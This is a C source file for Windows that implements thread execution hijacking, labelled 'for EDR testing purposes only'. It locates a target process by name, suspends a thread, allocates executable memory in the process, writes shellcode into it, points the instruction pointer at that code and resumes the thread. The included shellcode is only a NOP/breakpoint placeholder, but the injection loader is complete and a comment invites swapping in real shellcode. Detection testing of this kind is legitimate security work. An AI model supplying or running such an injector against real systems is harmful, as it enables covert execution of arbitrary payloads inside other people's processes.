/*
 * Thread Execution Hijacking (Thread Context Injection)
 * 
 * This technique hijacks an existing thread:
 * 1. Find target process and thread
 * 2. Suspend the thread
 * 3. Get thread context
 * 4. Allocate memory for shellcode
 * 5. Write shellcode
 * 6. Modify instruction pointer to shellcode
 * 7. Resume thread
 * 
 * For EDR testing purposes only.
 */

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

// Sample shellcode that returns control to original code
// This should be replaced with actual shellcode for testing
unsigned char shellcode[] = {
    0x90, 0x90, 0x90, 0x90,  // nop sled
    0xCC,                     // int3 (breakpoint for debugging)
    0xC3                      // ret
};

DWORD GetProcessIdByName(const char* processName) {
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }
    
    DWORD pid = 0;
    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (_stricmp(pe32.szExeFile, processName) == 0) {
                pid = pe32.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }
    
    CloseHandle(hSnapshot);
    return pid;
}

DWORD GetThreadIdByProcessId(DWORD pid) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }
    
    THREADENTRY32 te32;
    te32.dwSize = sizeof(THREADENTRY32);
    
    DWORD tid = 0;
    if (Thread32First(hSnapshot, &te32)) {
        do {
            if (te32.th32OwnerProcessID == pid) {
                tid = te32.th32ThreadID;
                break;
            }
        } while (Thread32Next(hSnapshot, &te32));
    }
    
    CloseHandle(hSnapshot);
    return tid;
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("Usage: %s <process_name>\n", argv[0]);
        printf("Example: %s notepad.exe\n", argv[0]);
        return 1;
    }
    
    const char* processName = argv[1];
    
    printf("[*] Thread Execution Hijacking Technique\n");
    printf("[*] Target Process: %s\n", processName);
    
    // Step 1: Get target process ID
    DWORD pid = GetProcessIdByName(processName);
    if (pid == 0) {
        printf("[!] Error: Process '%s' not found\n", processName);
        return 1;
    }
    printf("[+] Found process with PID: %d\n", pid);
    
    // Step 2: Get a thread ID from the process
    DWORD tid = GetThreadIdByProcessId(pid);
    if (tid == 0) {
        printf("[!] Error: No threads found in process\n");
        return 1;
    }
    printf("[+] Found thread with TID: %d\n", tid);
    
    // Step 3: Open process handle
    HANDLE hProcess = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE,
        pid
    );
    
    if (hProcess == NULL) {
        printf("[!] Error: Failed to open process. Error: %d\n", GetLastError());
        return 1;
    }
    printf("[+] Process handle obtained\n");
    
    // Step 4: Open thread handle
    HANDLE hThread = OpenThread(
        THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT,
        FALSE,
        tid
    );
    
    if (hThread == NULL) {
        printf("[!] Error: Failed to open thread. Error: %d\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] Thread handle obtained\n");
    
    // Step 5: Suspend the thread
    if (SuspendThread(hThread) == (DWORD)-1) {
        printf("[!] Error: Failed to suspend thread. Error: %d\n", GetLastError());
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] Thread suspended\n");
    
    // Step 6: Get thread context
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    
    if (!GetThreadContext(hThread, &ctx)) {
        printf("[!] Error: Failed to get thread context. Error: %d\n", GetLastError());
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return 1;
    }
    
    #ifdef _WIN64
        printf("[+] Original RIP: 0x%llx\n", ctx.Rip);
    #else
        printf("[+] Original EIP: 0x%x\n", ctx.Eip);
    #endif
    
    // Step 7: Allocate memory for shellcode
    LPVOID pRemoteShellcode = VirtualAllocEx(
        hProcess,
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    if (pRemoteShellcode == NULL) {
        printf("[!] Error: Failed to allocate memory. Error: %d\n", GetLastError());
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] Memory allocated at: 0x%p\n", pRemoteShellcode);
    
    // Step 8: Write shellcode to allocated memory
    SIZE_T bytesWritten;
    if (!WriteProcessMemory(hProcess, pRemoteShellcode, shellcode, sizeof(shellcode), &bytesWritten)) {
        printf("[!] Error: Failed to write shellcode. Error: %d\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteShellcode, 0, MEM_RELEASE);
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] Shellcode written (%zu bytes)\n", bytesWritten);
    
    // Step 9: Modify instruction pointer to point to shellcode
    #ifdef _WIN64
        ctx.Rip = (DWORD64)pRemoteShellcode;
        printf("[+] New RIP: 0x%llx\n", ctx.Rip);
    #else
        ctx.Eip = (DWORD)pRemoteShellcode;
        printf("[+] New EIP: 0x%x\n", ctx.Eip);
    #endif
    
    if (!SetThreadContext(hThread, &ctx)) {
        printf("[!] Error: Failed to set thread context. Error: %d\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteShellcode, 0, MEM_RELEASE);
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] Thread context modified\n");
    
    // Step 10: Resume the thread
    if (ResumeThread(hThread) == (DWORD)-1) {
        printf("[!] Error: Failed to resume thread. Error: %d\n", GetLastError());
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] Thread resumed\n");
    
    // Cleanup
    CloseHandle(hThread);
    CloseHandle(hProcess);
    
    printf("[+] Thread hijacking completed\n");
    printf("[!] Warning: Target process may crash if shellcode doesn't properly return control\n");
    
    return 0;
}
